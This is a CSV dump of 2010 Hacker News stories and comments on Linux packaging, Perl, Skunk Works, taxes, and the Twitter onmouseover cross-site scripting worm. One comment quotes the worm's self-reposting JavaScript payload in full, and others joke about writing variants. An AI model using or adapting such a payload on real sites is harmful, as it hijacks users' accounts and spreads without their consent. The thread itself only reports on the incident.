ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
1712418,comment,1712035,1712381,0,0,jedbrown,,,"<p><pre><code>    have there own repositories that are _not_ linked into the systems way of doing things
</code></pre>
One approach is to have a system that packages everything in the language-specific repository for the distro.  Haskell on Archlinux is an example of this.<p>I'm not a fan of actually using the language-specific packages because I like the rolling release model and end up having to do some manual work to reinstall all my packages when the distro upgrades it's copy (or switch to the next 6-month release with Ubuntu and similar).",1285073998
1712417,comment,1711815,1712320,0,0,loumf,,,"The photo wouldn't have led to the arrest if she hadn't matched it against the ones in MySpace one that was attached to the e-mail, names, and other people.",1285073998
1712416,comment,1712083,1712083,0,0,mcav,,,"You should put this on Kickstarter. From your blog's comments, it looks like you might be able to generate some non-negligible funding.",1285073995
1712415,story,,,1,0,Q_the_Novice,"Raging Flame Apps: CSV Converter",http://www.rflab.co.za/testground/yql/?sms_ss=hackernews,,1285073963
1712414,comment,1712035,1712398,0,0,acqq,,,"Thanks berntb! That's a perfect tip for a new submission:<p><a href=""http://news.ycombinator.com/item?id=1712404"" rel=""nofollow"">http://news.ycombinator.com/item?id=1712404</a><p>The DarkPAN matters<p>""There is currently some FUD going about in some parts of the Perl community about why we should break Perl 5 backwards compatibility. A short blog entry, schmarkpan, is a good example of the trend: loud, noisy, but clueless and devoid of any content.""",1285073948
1712413,comment,1712275,1712275,0,0,vanschelven,,,"Am I right to understand that Twitter does no JavaScript escaping whatsoever in a particular anchor tag?<p>In that case it surprises me that this has not been found before",1285073899
1712412,comment,1712018,1712018,0,0,thomasfl,,,"""Johnson crammed a small number of capable people into close proximity, so that “engineering shall always be within a stone’s throw of the airplane.”""<p>This is agile and extreme-programming at it's best.",1285073882
1712410,comment,1711470,1711768,0,0,yummyfajitas,,,"What are the advantages you receive due to white male-ness?<p>(Note: I'm asking about advantages to an individual, not statistical advantages to a group. )",1285073758
1712409,comment,1712018,1712018,0,0,balding_n_tired,,,"As I recall the P-80 never saw combat, at least in WW II. I remember it chiefly for killing Richard Bong, the USAAF leading ace.",1285073728
1712408,comment,1712275,1712393,0,0,nakkiel,,,"Who here didn't, at least for fun, try to make his own version of the Javascript bit? I'd like to have a variant of the full black Quine that randomizes the color used. It would be so shiny and Twitter wouldn't prevent it from reposting.<p>Here be Rainbows!",1285073721
1712407,comment,1712018,1712018,0,0,chwolfe,,,"I highly recommend Ben Rich's autobiography to anyone interested in the engineering and business practices behind Skunk Works:<p><a href=""http://www.amazon.com/Skunk-Works-Personal-Memoir-Lockheed/dp/0316743003/ref=sr_1_1?s=gateway&ie=UTF8&qid=1285073583&sr=8-1"" rel=""nofollow"">http://www.amazon.com/Skunk-Works-Personal-Memoir-Lockheed/d...</a>",1285073712
1712406,comment,1711192,1711636,0,0,joshuacc,,,"Good point. The extremes tend to reinforce each other by fueling the antipathy of the other side.",1285073696
1712405,comment,1712402,1712402,0,0,mikecane,,,"Yes, this is my post, but I haven't seen anyone else post a snap of one of the exploits being used.  The code is highlighted.",1285073693
1712404,story,,,24,9,acqq,"Perl Developers Actively Care About Backwards Compatibility",http://consttype.blogspot.com/2009/07/darkpan-matters.html,,1285073690
1712403,comment,1712065,1712132,0,0,petervandijck,,,"Yes, but that's only loaded once and then cached, so it's not such a big deal.",1285073676
1712402,story,,,1,1,mikecane,"My Twitter Account Has Been Taken Over",http://mikecanex.wordpress.com/2010/09/21/my-twitter-account-has-been-taken-over/,,1285073659
1712400,comment,1712018,1712314,0,0,GBond,,,"It is always good to learn the abstraction layer below when creating something. For designing physical objects that will one day be physical products, it makes a lot of sense to understand the manufacturing process and materials involved.<p>To use your example of software... I've encountered one too many people who are billed as an Enterprise software ""architects"" who have never coded a single line  production software in their life <cringe>. Needless to say, these projects almost always end up a disaster.",1285073448
1712399,comment,1712275,1712370,0,0,paraschopra,,,"Nice social engineering trick :)<p>[PS: Just kidding]",1285073414
1712398,comment,1712035,1712356,0,0,berntb,,,"This backwards compatibility is a conscious decision. And it is argued about. To find a bit to read about that, Google e.g. for darkpan. (It is probably one reason why Perl 5 is so extensible.)",1285073397
1712397,comment,1712275,1712347,0,0,quadhome,,,"samy is my hero<p><a href=""http://namb.la/popular/"" rel=""nofollow"">http://namb.la/popular/</a>",1285073390
1712396,comment,1712275,1712275,0,0,nakkiel,,,"I got the Quine which changes the color and background color of the post to black. I initially though it was some sort of art. I admit I'm totally disappointed.<p><pre><code>    http://a.no/@onmouseover=;$(textarea:first).val(this.innerHTML);$(.status-update-form).submit() style=""color:#000;background:#000;/</code></pre>",1285073389
1712395,story,,,1,0,petethomas,"Artificial Intelligence Goes Mobile",http://www.businessweek.com/technology/content/sep2010/tc20100920_845294.htm,,1285073386
1712394,story,,,9,0,jeffbarr,"Now Available: Host Your Web Site in the Cloud",http://aws.typepad.com/aws/2010/09/now-available-host-your-web-site-in-the-cloud.html,,1285073363
1712393,comment,1712275,1712352,0,0,paraschopra,,,"So, you are publicly saying that you are currently trying to hack Twitter by making a worm? :)",1285073343
1712392,story,,,1,0,labboy,"Survey finds low use of Microsoft encryption technology",http://www.networkworld.com/news/2010/092110-survey-finds-low-use-of.html,,1285073340
1712391,comment,1712275,1712275,0,0,Jem,,,"I called this 3 hours ago - do I get a cookie? :)",1285073339
1712390,comment,1712035,1712035,0,0,fauigerzigerk,,,"He's absolutely right. I have come to the conclusion that we must do one thing: Stop sharing. Shared libraries and language runtimes are a relic of the past when memory and storage were orders of magnitude smaller. Bundle all dependencies and throw out the package managers!",1285073231
1712389,story,,,1,0,honza,"Posterous-style blogging on Google App Engine",http://www.honza.ca/2010/07/posterous-style-blogging-on-app-engine/,,1285073222
1712388,comment,1711643,1711643,0,0,NonEUCitizen,,,"You should insist that the ""pay it back to them"":<p>1.  only applies if you quit, not if they fire you<p>2.  be pro-rata -- i.e. if you quit after 9 months, you only pay back (12-9)/12 = 1/4 of the bonus<p>With the above, you can also ask (not necessarily insist), that they pay you the bonus now, or by the next paycheck.",1285073179
1712387,comment,1712018,1712018,0,0,nickpinkston,,,"Modern MechE's seemingly can't build anything either - at least where I went to school. The SAE formula guys are the only ones it seemed.<p>I'm not sure what I think about engineers who can only CAD up a part but couldn't make it.",1285073159
1712386,comment,1710702,1711180,0,0,mikecaron,,,"Yeah, the whole vim/emacs war is so 1995.",1285073148
1712385,story,,,3,0,Maakuth,"Phoronix: Direct3D 10/11 Is Now Natively Implemented On Linux",http://www.phoronix.com/scan.php?page=article&item=mesa_gallium3d_d3d11&num=1,,1285073122
1712384,comment,1711287,1711569,0,0,hga,,,"And even more people don't ""<i>expend time and money hiring accountants and lawyers to structure their investments</i>"", they just do simple obvious things, like put money into tax free municipal bonds instead of things that might grow the economy (for a worst case, a money losing stadium complex vs. a startup).<p>I watched my parent's economic behavior change quite a bit after the Carter and Reagan tax cuts, specifically on capital gains (yes, Carter started this <i>and</i> the general deregulation of the economy, e.g. air travel and trucks), on ""unearned"" income (70% before the Reagan tax cuts), etc.<p>Their behavior and many others became economically much more productive, resulting in the long boom from 1983-4 to the ""new normal"" we fear will come from the Great Recession <i>and</i> the responses to it.",1285073117
1712383,comment,1712275,1712275,0,0,jdub,,,"I wouldn't be terribly surprised, based on the timeline of exploits I've seen, if the wider abuse of this is due to the <i>incredibly</i> stupid exploit demonstration at the launch of @RainbowTwtr.<p>My related tweets from earlier tonight... ah, about the RainbowTwtr angle, not exploited tweets! :-)<p><a href=""http://twitter.com/jdub/status/25106766206"" rel=""nofollow"">http://twitter.com/jdub/status/25106766206</a>
<a href=""http://twitter.com/jdub/status/25112834543"" rel=""nofollow"">http://twitter.com/jdub/status/25112834543</a>",1285073113
1712382,comment,1711470,1711470,0,0,thrill,,,"Yeah, it's not like they worked to earn it or anything - oh wait.",1285073096
